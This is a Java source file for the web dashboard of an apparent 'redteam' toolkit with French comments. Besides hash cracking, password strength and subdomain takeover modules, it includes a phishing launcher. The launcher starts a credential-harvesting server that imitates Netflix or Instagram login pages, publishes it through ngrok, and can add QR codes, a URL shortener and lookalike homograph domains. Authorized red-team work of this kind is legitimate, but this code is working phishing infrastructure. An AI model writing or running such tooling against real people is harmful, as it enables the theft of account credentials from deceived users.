package fr.redteam.web;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import fr.redteam.core.DefaultReport;
import fr.redteam.core.Module;
import fr.redteam.core.Report;
import fr.redteam.core.Target;
import fr.redteam.db.DatabaseManager;
import fr.redteam.credential.HashCracker;
import fr.redteam.credential.PasswordStrengthAnalyzer;
import fr.redteam.phishing.HomographGenerator;
import fr.redteam.phishing.QrCodeGenerator;
import fr.redteam.recon.SubdomainTakeoverChecker;
import fr.redteam.util.NgrokHelper;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;

/**
 * Serveur web Bootstrap pour le dashboard RedTeam.
 */
public class DashboardServer {

    private static final int PORT = 7070;
    private static final Map<String, Module> MODULES = new HashMap<>();

    static {
        MODULES.put("hashcracker", new HashCracker());
        MODULES.put("passwordstrengthanalyzer", new PasswordStrengthAnalyzer());
        MODULES.put("subdomaintakeoverchecker", new SubdomainTakeoverChecker());
        MODULES.put("homographgenerator", new HomographGenerator());
    }

    private HttpServer server;
    private PhishingHttpServer phishingServer;
    private Process ngrokProcess;
    private boolean shortenerStarted;

    public void start() throws IOException {
        server = HttpServer.create(new InetSocketAddress("0.0.0.0", PORT), 0);
        server.createContext("/", this::serveIndex);
        server.createContext("/api/", this::handleApi);
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("\n  Dashboard Bootstrap: http://127.0.0.1:" + PORT);
        System.out.println("  Appuyez sur Entrée pour arrêter.\n");
    }

    public void stop() {
        if (phishingServer != null) phishingServer.stop();
        if (shortenerStarted) UrlShortener.stopServer();
        if (ngrokProcess != null && ngrokProcess.isAlive()) ngrokProcess.destroyForcibly();
        if (server != null) server.stop(0);
    }

    private void serveIndex(HttpExchange ex) throws IOException {
        if (!"GET".equals(ex.getRequestMethod())) {
            send(ex, 405, "Method Not Allowed");
            return;
        }
        String path = ex.getRequestURI().getPath();
        if (!"/".equals(path) && !"/index.html".equals(path)) {
            send(ex, 404, "Not Found");
            return;
        }
        byte[] html = getClass().getResourceAsStream("/web/index.html").readAllBytes();
        ex.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
        ex.sendResponseHeaders(200, html.length);
        try (OutputStream out = ex.getResponseBody()) { out.write(html); }
    }

    private void handleApi(HttpExchange ex) throws IOException {
        if (!"POST".equals(ex.getRequestMethod())) {
            sendJson(ex, 405, Map.of("error", "Method Not Allowed"));
            return;
        }
        String path = ex.getRequestURI().getPath().replace("/api", "");
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
        Map<String, Object> params = parseJson(body);

        try {
            if ("/hashcracker".equals(path)) {
                String input = (String) params.getOrDefault("input", "");
                runModule("hashcracker", input, -1, ex);
            } else if ("/strength".equals(path)) {
                String pwd = (String) params.getOrDefault("password", "");
                runModule("passwordstrengthanalyzer", pwd, -1, ex);
            } else if ("/subdomain".equals(path)) {
                String domain = (String) params.getOrDefault("domain", "");
                runModule("subdomaintakeoverchecker", domain, -1, ex);
            } else if ("/homograph".equals(path)) {
                String domain = (String) params.getOrDefault("domain", "netflix.com");
                String filePath = HomographGenerator.runAndGetFilePath(domain);
                Map<String, Object> out = new HashMap<>();
                out.put("filePath", filePath != null ? filePath : "");
                out.put("findings", filePath != null ? List.of("Fichier généré: " + filePath) : List.of("Erreur"));
                sendJson(ex, 200, out);
            } else if ("/phishing/start".equals(path)) {
                handlePhishingStart(params, ex);
            } else {
                sendJson(ex, 404, Map.of("error", "Unknown API"));
            }
        } catch (Exception e) {
            sendJson(ex, 500, Map.of("error", e.getMessage(), "findings", List.of()));
        }
    }

    private void runModule(String name, String host, int port, HttpExchange ex) throws IOException {
        Module m = MODULES.get(name);
        if (m == null) {
            sendJson(ex, 404, Map.of("error", "Module not found"));
            return;
        }
        Report report = new DefaultReport();
        m.run(new Target(host, port), report);
        DatabaseManager.saveRun("gui", m.getName(), host, report.getFindings());
        sendJson(ex, 200, Map.of("findings", report.getFindings()));
    }

    private void handlePhishingStart(Map<String, Object> params, HttpExchange ex) throws IOException {
        String template = (String) params.getOrDefault("template", "netflix");
        boolean wantQr = Boolean.TRUE.equals(params.get("qr"));
        boolean wantShortener = Boolean.TRUE.equals(params.get("shortener"));
        boolean wantHomograph = Boolean.TRUE.equals(params.get("homograph"));

        int port = 8080;
        int shortenerPort = 9090;

        phishingServer = new PhishingHttpServer("0.0.0.0", port, new PhishingPageGenerator(), new CredentialHarvester(), template);
        phishingServer.start();

        ngrokProcess = NgrokHelper.startNgrok(port);
        String publicUrl = "http://127.0.0.1:" + port;
        if (ngrokProcess != null) {
            try {
                Thread.sleep(3500);
                String ngrokUrl = NgrokHelper.getPublicUrl(8, 500);
                if (ngrokUrl != null) publicUrl = ngrokUrl;
            } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
        }

        String qrFilePath = null;
        if (wantQr) {
            Report qrReport = new DefaultReport();
            new QrCodeGenerator().run(new Target(publicUrl, -1), qrReport);
            for (String f : qrReport.getFindings()) {
                if (f.contains("Fichier généré:")) {
                    qrFilePath = f.replaceFirst(".*Fichier généré:\\s*", "").replaceAll("\\[QrCodeGenerator\\]\\s*", "").trim();
                    break;
                }
            }
        }

        String shortenerUrl = null;
        if (wantShortener) {
            UrlShortener.startServer(shortenerPort, publicUrl);
            shortenerStarted = true;
            shortenerUrl = UrlShortener.getShortUrl(shortenerPort);
        }

        String domainForHomograph = "netflix".equals(template) ? "netflix.com" : "instagram.com";
        String homographFilePath = wantHomograph ? HomographGenerator.runAndGetFilePath(domainForHomograph) : null;

        Map<String, Object> out = new HashMap<>();
        out.put("url", publicUrl);
        out.put("shortener", shortenerUrl);
        out.put("qrFile", qrFilePath);
        out.put("homographFile", homographFilePath);
        DatabaseManager.saveRun(
                "gui",
                "PhishingAssistant",
                template,
                List.of(
                        "URL: " + publicUrl,
                        "Shortener: " + (shortenerUrl == null ? "" : shortenerUrl),
                        "QR: " + (qrFilePath == null ? "" : qrFilePath),
                        "Homograph: " + (homographFilePath == null ? "" : homographFilePath)
                )
        );
        sendJson(ex, 200, out);
    }

    private Map<String, Object> parseJson(String body) {
        Map<String, Object> m = new HashMap<>();
        if (body == null || body.isEmpty()) return m;
        java.util.regex.Pattern p = java.util.regex.Pattern.compile("\"([^\"]+)\"\\s*:\\s*\"([^\"]*)\"");
        java.util.regex.Matcher matcher = p.matcher(body);
        while (matcher.find()) m.put(matcher.group(1), matcher.group(2));
        p = java.util.regex.Pattern.compile("\"([^\"]+)\"\\s*:\\s*(true|false)");
        matcher = p.matcher(body);
        while (matcher.find()) m.put(matcher.group(1), "true".equals(matcher.group(2)));
        return m;
    }

    private void sendJson(HttpExchange ex, int code, Object obj) throws IOException {
        String json = toJson(obj);
        byte[] bytes = json.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "application/json; charset=UTF-8");
        ex.sendResponseHeaders(code, bytes.length);
        try (OutputStream out = ex.getResponseBody()) { out.write(bytes); }
    }

    private String toJson(Object obj) {
        if (obj instanceof Map) {
            Map<?, ?> m = (Map<?, ?>) obj;
            StringBuilder sb = new StringBuilder("{");
            for (Map.Entry<?, ?> e : m.entrySet()) {
                if (sb.length() > 1) sb.append(",");
                sb.append("\"").append(e.getKey()).append("\":");
                Object v = e.getValue();
                if (v instanceof List) sb.append(toJsonArray((List<?>) v));
                else if (v instanceof String) sb.append("\"").append(escapeJson((String) v)).append("\"");
                else sb.append(v == null ? "null" : "\"" + v + "\"");
            }
            return sb.append("}").toString();
        }
        return "{}";
    }

    private String toJsonArray(List<?> list) {
        StringBuilder sb = new StringBuilder("[");
        for (Object o : list) {
            if (sb.length() > 1) sb.append(",");
            sb.append("\"").append(escapeJson(o.toString())).append("\"");
        }
        return sb.append("]").toString();
    }

    private String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
    }

    private void send(HttpExchange ex, int code, String msg) throws IOException {
        byte[] b = msg.getBytes(StandardCharsets.UTF_8);
        ex.sendResponseHeaders(code, b.length);
        try (OutputStream out = ex.getResponseBody()) { out.write(b); }
    }
}
